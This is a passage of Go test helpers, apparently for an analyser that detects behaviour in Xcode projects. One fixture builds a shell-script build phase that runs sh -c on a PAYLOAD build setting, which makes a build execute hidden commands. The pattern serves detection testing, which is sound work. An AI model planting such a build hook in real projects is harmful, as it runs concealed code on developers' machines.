	targetDebugSetting := xcodeSettingDeclaration(targetDebug)
	targetReleaseSetting := xcodeSettingDeclaration(targetRelease)
	return fmt.Sprintf(`
		PROJECT = { isa = PBXProject; targets = (TARGET); buildConfigurationList = PROJECT_LIST; };
		TARGET = { isa = PBXNativeTarget; name = App; buildPhases = (PHASE); buildConfigurationList = TARGET_LIST; };
		PHASE = {
			isa = PBXShellScriptBuildPhase;
			name = Resolve;
			shellPath = /bin/sh;
			shellScript = "sh -c \"${PAYLOAD}\"";
		};
		PROJECT_LIST = { isa = XCConfigurationList; buildConfigurations = (PROJECT_DEBUG, PROJECT_RELEASE); };
		TARGET_LIST = { isa = XCConfigurationList; buildConfigurations = (TARGET_DEBUG, TARGET_RELEASE); };
		PROJECT_DEBUG = { isa = XCBuildConfiguration; name = Debug; buildSettings = { %s }; };
		PROJECT_RELEASE = { isa = XCBuildConfiguration; name = Release; buildSettings = { %s }; };
		TARGET_DEBUG = { isa = XCBuildConfiguration; name = Debug; buildSettings = { %s }; };
		TARGET_RELEASE = { isa = XCBuildConfiguration; name = Release; buildSettings = { %s }; };
	`, projectDebugSetting, projectReleaseSetting, targetDebugSetting, targetReleaseSetting)
}

func xcodeBuildSettingObjectsWithBaseConfigs(projectDebug, projectRelease string) string {
	objects := xcodeBuildSettingObjects(projectDebug, projectRelease, "", "")
	objects = strings.Replace(objects, `PROJECT = { isa = PBXProject;`, `PROJECT = { isa = PBXProject; mainGroup = MAIN;`, 1)
	objects = strings.Replace(objects, `TARGET_DEBUG = { isa = XCBuildConfiguration; name = Debug; buildSettings = {  }; };`, `TARGET_DEBUG = { isa = XCBuildConfiguration; name = Debug; baseConfigurationReference = DEBUG_CONFIG; buildSettings = {}; };`, 1)
	objects = strings.Replace(objects, `TARGET_RELEASE = { isa = XCBuildConfiguration; name = Release; buildSettings = {  }; };`, `TARGET_RELEASE = { isa = XCBuildConfiguration; name = Release; baseConfigurationReference = RELEASE_CONFIG; buildSettings = {}; };`, 1)
	objects += `
		MAIN = { isa = PBXGroup; children = (PODS); sourceTree = "<group>"; };
		PODS = { isa = PBXGroup; children = (DEBUG_CONFIG, RELEASE_CONFIG); path = Pods; sourceTree = "<group>"; };
		DEBUG_CONFIG = { isa = PBXFileReference; path = Debug.xcconfig; sourceTree = "<group>"; };
		RELEASE_CONFIG = { isa = PBXFileReference; path = Release.xcconfig; sourceTree = "<group>"; };
	`
	return objects
}

func xcodeSettingDeclaration(value string) string {
	if value == "" {
		return ""
	}
	return `PAYLOAD = "` + openStepQuoted(value) + `";`
}

func openStepQuoted(value string) string {
	value = strings.ReplaceAll(value, `\`, `\\`)
	value = strings.ReplaceAll(value, `"`, `\"`)
	value = strings.ReplaceAll(value, "\n", `\n`)
	return value
}

func extractXcodeBuildSettingFixture(t *testing.T, objects string) behavior.Graph {
	t.Helper()
	project := xcodeProjectContent(objects, "PROJECT")
	var graph behavior.Graph
	ExtractPackageHooks(&graph, project)
	ResolveXcodeBuildSettings(&graph, nil, []artifact.Content{project})
	return graph
}

func findXcodeResolvedSettingFeature(t *testing.T, graph behavior.Graph, key string) behavior.Feature {
	t.Helper()
	for _, feature := range graph.Features {
		if feature.Key == "xcode.build_setting.resolved" && feature.Value == key {
			return feature
		}
	}
	t.Fatalf("missing resolved Xcode build-setting feature %q: %#v", key, graph.Features)
	return behavior.Feature{}
}

func hasXcodeResolvedSettingFeature(graph behavior.Graph, key string) bool {
	for _, feature := range graph.Features {
		if feature.Key == "xcode.build_setting.resolved" && feature.Value == key {
			return true
		}
	}
	return false
}

func assertNoXcodeResolvedBehavior(t *testing.T, graph behavior.Graph) {
	t.Helper()
	if hasXcodeResolvedSettingFeature(graph, "PAYLOAD") || len(graph.Operations) != 0 {
		t.Fatalf("unresolved Xcode setting produced behavior: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func hasOperationRelationKind(relations []behavior.OperationRelation, kind behavior.RelationKind) bool {
	for _, relation := range relations {
		if relation.Kind == kind {
			return true
		}
	}
	return false
}

func hasOperationResource(operations []behavior.ModeledOperation, kind behavior.OperationKind, value string) bool {
	for _, operation := range operations {
		if operation.Kind != kind {
			continue
		}
		for _, binding := range operation.ResourceBindings {
			if binding.Resource.Value == value {
				return true
			}
		}
	}
	return false
}

func hasEvidenceKind(evidence []behavior.Evidence, kind string) bool {
	for _, item := range evidence {
		if item.Kind == kind {
			return true
		}
	}
	return false
}

func coverageDetailContains(coverage []behavior.Coverage, area, detail string) bool {
	for _, item := range coverage {
		if item.AnalysisArea == area && strings.Contains(item.Detail, detail) {
			return true
		}
	}
	return false
}

func containsEveryString(haystack, needles []string) bool {
	for _, needle := range needles {
		if !stringSliceContains(haystack, needle) {
			return false
		}
	}
	return true
}
